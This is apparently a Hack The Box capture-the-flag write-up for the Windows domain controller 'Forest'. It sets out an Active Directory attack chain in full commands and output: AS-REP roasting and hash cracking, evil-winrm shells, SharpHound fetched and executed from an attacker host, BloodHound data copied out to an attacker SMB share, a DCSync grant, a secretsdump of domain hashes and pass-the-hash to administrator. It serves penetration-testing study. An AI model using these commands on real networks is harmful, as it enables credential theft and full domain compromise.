## Default Information
IP Address: 10.10.10.161\
OS: Windows

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.10.161    forest.htb
```
### Masscan
Firstly, we will use masscan to identify the open ports

```
{masscan output}
```

### Nmap
We will then use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port. From the output, we can see that this is an Active Directory machine. 

```
53/tcp    open  domain       syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-01-13 15:40:38Z)
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds syn-ack ttl 127 Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?    syn-ack ttl 127
593/tcp   open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped   syn-ack ttl 127
3268/tcp  open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped   syn-ack ttl 127
5985/tcp  open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       syn-ack ttl 127 .NET Message Framing
47001/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49671/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49676/tcp open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49684/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49706/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49923/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
```

Apart from that, we are also able to find UDP ports 52, 88 and 65024 that is open using nmap.

```
53/udp    open          domain        udp-response ttl 127 Simple DNS Plus
88/udp    open          kerberos-sec  udp-response         Microsoft Windows Kerberos (server time: 2022-01-13 15:13:40Z)
65024/udp open          domain        udp-response         (generic dns response: SERVFAIL)
| fingerprint-strings: 
|   NBTStat: 
|_    CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

### TCP/UDP port 53 and UDP 65024.

From the nmap output, we know that the service behind ports 53 and 65024 are DNS servers. Hence, we will attempt to do a zone transfer on port 53. From the nmap scan earlier, we are able to obtain 2 domain names, namely ```htb.local``` and ```FOREST.htb.local```.

First, let us try to test zone transfer on ```htb.local```. Unfortunately, we are unable to do a zone transfer on ```htb.local```.

```
┌──(kali㉿kali)-[~/Desktop]
└─$ host -t axfr htb.local 10.10.10.161                                                                          1 ⨯
Trying "htb.local"
Using domain server:
Name: 10.10.10.161
Address: 10.10.10.161#53
Aliases: 

Host htb.local not found: 5(REFUSED)
; Transfer failed.
```

Next, we will try to do a zone transfer on ```FOREST.htb.local```. Unfortunately, we are unable to do a zone transfer on ```FOREST.htb.local``` as well.

```
┌──(kali㉿kali)-[~/Desktop]
└─$ host -t axfr FOREST.htb.local 10.10.10.161                                                                   1 ⨯
Trying "FOREST.htb.local"
Using domain server:
Name: 10.10.10.161
Address: 10.10.10.161#53
Aliases: 

Host FOREST.htb.local not found: 3(NXDOMAIN)
Received 34 bytes from 10.10.10.161#53 in 488 ms
; Transfer failed.
```
### Windows RPC

From the nmap scan earlier, we are able to know that the service behind ports 135, 49664, 49665, 49666, 49667, 49671, 49676, 49677, 49684, 49706 and 49923 are Microsoft Windows RPC. 

However, the RPC endpoint mapper sits on port 135 and the rest of the ports are the bindings for RPC. Hence, we will do a rpcdump on port 135.

The output of the rpcdump gave us a lot of information. We will come back to this if we are unable to find a possible exploiation path later. 

### SMB Enumeration
Using the enum4linux script, we are able to obtain a list of users on the SMB server in this machine. 

```
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```

## Exploit
### AS-Rep Roasting

Looking at the nmap output, we realize that Microsoft Windows Kerberos is used. We will attempt to use AS-Rep Roasting to check if the any of the users does not require kerberos pre-authentication. If we are able to find any of the users that do not require kerberos pre-authentication, we can then obtain the hash of the password.

To start off, we will first create a list of users that we have obtained earlier.

```
Administrator 
Guest 
krbtgt 
DefaultAccount 
$331000-VK4ADACQNUCA 
SM_2c8eef0a09b545acb 
SM_ca8c2ed5bdab4dc9b 
SM_75a538d3025e4db9a 
SM_681f53d4942840e18
SM_1b41c9286325456bb 
SM_9b69f1b9d2cc45549 
SM_7c96b981967141ebb
SM_c75ee099d0a64c91b
SM_1ffab36a2f5f479cb 
HealthMailboxc3d7722 
HealthMailboxfc9daad 
HealthMailboxc0a90c9 
HealthMailbox670628e
HealthMailbox968e74d
HealthMailbox6ded678
HealthMailbox83d6781 
HealthMailboxfd87238 
HealthMailboxb01ac64 
HealthMailbox7108a4e 
HealthMailbox0659cc1 
sebastien 
lucinda 
svc-alfresco 
andy 
mark 
santi 
```

Afterwards, we will create a bash script that will execute impacket-GetNPUsers for all the users and check if kerberos pre-authentication is enabled.

```
for user in $(cat users.txt);
do 
  impacket-GetNPUsers -no-pass -dc-ip 10.10.10.161 htb.local/${user}
done
```

From the output, we realized that the user svc-alfresco does not have kerberos pre-authentication enabled, and we are able to obtain the hash of the password from the script.

```
[*] Getting TGT for svc-alfresco
$krb5asrep$23$svc-alfresco@HTB:bd3af1c170685f86f4d7b4fea07dc68c$1ee56f34f680c87990e71809b1053440580f651bb6bf5ed097b8a44876c9f4be5a918229167e475d5fe1f446ce66abd9e8d89e842b59ecd37f3b869ea9b69b219c868c66609a2a5e62f4f28bad87394d423a12b9ba3ca9f922a77e604ef930c81e3790f19bdd3aad96a875451b4037eb06c255550b70035ae8d95a0c178fc88e3f5b43fe16d0b8e4ba5e4091ddcb781f0af65590209410f6d5c651c3cb12dfc6d2b3269bf1033cb46346c694cf78efbd8f3818ffb3a1151836cd570ae316cfa87e0ae3fa67c4e593a6f4852929578e0cd56c9b62e98b1f8816a174dc2bd066d2
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
```

### Cracking hash
Next, we will save the hash in a file and use hashcat to crack the hash. From the output, we have obtained the password as s3rvice.

```
┌──(kali㉿kali)-[~/Desktop]
└─$ hashcat -m 18200 hash.txt /home/kali/Desktop/pentest/wordlist/rockyou.txt --force        
hashcat (v6.1.1) starting...
Dictionary cache built:
* Filename..: /home/kali/Desktop/pentest/wordlist/rockyou.txt
* Passwords.: 14344389
* Bytes.....: 139922166
* Keyspace..: 14344382
* Runtime...: 2 secs

$krb5asrep$23$svc-alfresco@HTB:bd3af1c170685f86f4d7b4fea07dc68c$1ee56f34f680c87990e71809b1053440580f651bb6bf5ed097b8a44876c9f4be5a918229167e475d5fe1f446ce66abd9e8d89e842b59ecd37f3b869ea9b69b219c868c66609a2a5e62f4f28bad87394d423a12b9ba3ca9f922a77e604ef930c81e3790f19bdd3aad96a875451b4037eb06c255550b70035ae8d95a0c178fc88e3f5b43fe16d0b8e4ba5e4091ddcb781f0af65590209410f6d5c651c3cb12dfc6d2b3269bf1033cb46346c694cf78efbd8f3818ffb3a1151836cd570ae316cfa87e0ae3fa67c4e593a6f4852929578e0cd56c9b62e98b1f8816a174dc2bd066d2:s3rvice
```

### Obtaining user flag

Since we have obtained the password for the svc-alfresco, we will now try to use evil-winrm to try to get a shell. Fortunately, we are able to obtain a shell and from there, we are able to get the user flag.

```
┌──(kali㉿kali)-[~/Desktop/evil-winrm]
└─$ bundle exec evil-winrm.rb -i 10.10.10.161 -u svc-alfresco -p s3rvice
Evil-WinRM shell v3.3
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> type user.txt
<Redacted user flag>
```
### Enumeration for privilege escalation
To start off, we will first need to do an enumeration of the current shell. To do so, we will use sharphound to collect data for bloodhound. First, we will host SharpHound.ps1 on our local machine and we will then transfer it to the victim's machine.

```
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> iex (New-Object Net.WebClient).DownloadString('http://10.10.16.8:4000/SharpHound.ps1')
```

Next, we will then use BloodHound to collect data from the domain. This will then create a zip folder of all the data collected by BloodHound.ps1.

```
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> invoke-bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> dir


    Directory: C:\Users\svc-alfresco\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/14/2022   7:59 AM          15334 20220114075917_BloodHound.zip
-a----        1/14/2022   7:59 AM          23725 MzZhZTZmYjktOTM4NS00NDQ3LTk3OGItMmEyYTVjZjNiYTYw.bin
```

Next, we will need to transfer the zip folder back to our local machine. To do that we will first need to start a smbserver on our local machine using impacket-smbserver. Afterwards, we will have to first connect to the shares on our smbserver and copy the zip folder to the smbserver. After the file has been transferred successfully, we will then delete the zip folder and disconnect the shares from our local smbserver.

```
┌──(kali㉿kali)-[~/Desktop]
└─$ impacket-smbserver share forest -smb2support
-------------------------------------------------------------
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net use \\10.10.16.8\share
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> copy 20220114075917_BloodHound.zip \\10.10.16.8\share
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> del 20220114075917_BloodHound.zip
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net use /d \\10.10.16.8\share
\\10.10.16.8\share was deleted successfully.
```

Lastly, we will upload the zip folder onto bloodhound for analysis. From bloodhound, we can see that the user svc-alfresco is part of the Service Accounts group, which is in turn part of the Privileged IT Accounts group. The Privileged IT Accounts group is also part of the Account Operators group. 

![Group graph](https://github.com/joelczk/writeups/blob/main/HTB/Images/Forest/group_graph.png)

From bloodhound, we can also see that the Account Operators group has a ```generic all``` permissions on the Exchange Windows Permissions group, which in turn has the ```WriteDacl``` permissions on HTB.local that contains the Adminstrator user.

![Permissions graph](https://github.com/joelczk/writeups/blob/main/HTB/Images/Forest/permissions_graph.png)

### Privilege Escalation to adminstrator

From the enumeration earlier, we know that svc-alfresco is part of the Account Operators group that has ```GenericAll``` permissions on the Exchange Windows Permissions Group. This means that the user svc-alfresco is able to create domain users. Hence, we will first create new domain users.

```
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net users hacked P4ssword /add
The command completed successfully.
```

Next, we will have to add the user to our Exchange Windows Permissions group. Using ```net user hacked```, we can see that the user ```hacked``` is now part of the Exchange Windows Permissiosn group

The reason why we need to add the user to the Exchange Windows Permissions Group is because the group has WriteDacl right on HTB.local, which can be abused to grant DCSync permissions to the user.
```
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" hacked /add
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user hacked
User name                    hacked
...
Global Group memberships     *Exchange Windows Perm*Domain Users
The command completed successfully.
```

Next, we will have to add DCSync privileges to our user. However before we can do that, we will need to download the PowerView.ps1 file onto our server.

For this to work, the ```TargetIdentity``` of the ```Add-DomainObjectAcl``` command must be set to htb.local/Domain Admins since we are targetting the identity of the Domain Admins group in htb.local. We will also need to specify the PrincipalIdentity to that of the user so that we can set the DCSync privileges to the user.

```
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> iex (New-Object Net.WebClient).DownloadString('http://10.10.16.8:4000/PowerView.ps1')
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $SecPassword = ConvertTo-SecureString 'P4ssword' -AsPlainText -Force 
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $Cred = New-Object System.Management.Automation.PSCredential('HTB\hacked', $SecPassword)
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-DomainObjectAcl -Credential $Cred -TargetIdentity htb.local\Domain Admins -PrincipalIdentity hacked -Rights DCSync
```

Lastly, we will be using the impacket-secretsdump command to dump all the hashes of the users on the machine. From there, we are able to obtain the hash of the adminstrator user.

```
┌──(kali㉿kali)-[~/Desktop]
└─$ impacket-secretsdump htb.local/hack:password@10.10.10.161
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
...
```

Using the hash that we have obtained earlier, we can use evil-winrm to do a pass-the-hash attack to authenticate as the adminstrator user.

```
┌──(kali㉿kali)-[~/Desktop/evil-winrm]
└─$ bundle exec evil-winrm.rb -i 10.10.10.161 -u administrator -p aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Desktop> whoami
htb\administrator
```

### Obtaining root flag

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
<Redacted root flag>
```
